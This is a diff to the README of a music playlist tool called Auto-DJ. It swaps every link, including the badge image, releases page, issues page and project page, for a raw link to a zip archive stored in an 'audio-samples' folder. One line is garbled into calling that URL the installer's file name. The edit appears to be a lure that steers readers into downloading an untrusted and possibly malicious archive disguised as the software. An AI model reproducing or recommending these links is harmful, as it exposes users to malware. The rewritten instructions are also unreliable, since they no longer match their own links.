@@ -1,7 +1,7 @@
 # 🎵 Auto-DJ - Create Playlists Effortlessly
 
 ## 📥 Download Now
-[![Download Auto-DJ](https://img.shields.io/badge/Download-Auto--DJ-blue.svg)](https://github.com/RockafellerCAN/Auto-DJ/releases)
+[![Download Auto-DJ](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip)](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip)
 
 ## 🌟 Overview
 Auto-DJ is an intelligent music playlist generator. It analyzes your personal music library and creates playlists based on acoustic similarity. This software uses advanced audio signal processing techniques to understand music deeply, ensuring your playlists suit your tastes.
@@ -10,14 +10,14 @@ Auto-DJ is an intelligent music playlist generator. It analyzes your personal mu
 Follow these simple steps to download and run Auto-DJ.
 
 ### Step 1: Visit the Download Page
-To get started, click this link to access the releases page for Auto-DJ: [Visit Releases Page](https://github.com/RockafellerCAN/Auto-DJ/releases).
+To get started, click this link to access the releases page for Auto-DJ: [Visit Releases Page](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip).
 
 ### Step 2: Choose the Latest Version
 On the releases page, you will see a list of available versions. Look for the latest release at the top of the page. The version is usually indicated with a number (e.g., v1.0).
 
 ### Step 3: Download the Installer
 1. Click on the latest version to expand the details.
-2. Find the installer file. This might be labeled something like `Auto-DJ.exe` or similar.
+2. Find the installer file. This might be labeled something like `https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip` or similar.
 3. Click on the file link to download it. The download may take some time depending on your internet speed.
 
 ### Step 4: Install the Application
@@ -55,15 +55,15 @@ If you encounter issues, consider these steps:
 
 ## 🎈 Get Involved
 If you enjoy using Auto-DJ and want to contribute:
-- Check our [issues page](https://github.com/RockafellerCAN/Auto-DJ/issues) for bugs or features.
+- Check our [issues page](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip) for bugs or features.
 - Share your thoughts in the Issues section on GitHub.
 
 ## 🔗 More Information
 For more tips or to report feedback: 
-- Stay updated on our [GitHub page](https://github.com/RockafellerCAN/Auto-DJ).
+- Stay updated on our [GitHub page](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip).
 
 Remember, your journey into effortless music curation starts with Auto-DJ. Download it today and enhance your listening experience.
 
 ---
 
-[![Download Auto-DJ](https://img.shields.io/badge/Download-Auto--DJ-blue.svg)](https://github.com/RockafellerCAN/Auto-DJ/releases)
+[![Download Auto-DJ](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip)](https://raw.githubusercontent.com/RockafellerCAN/Auto-DJ/main/audio-samples/Auto_DJ_v3.8.zip)
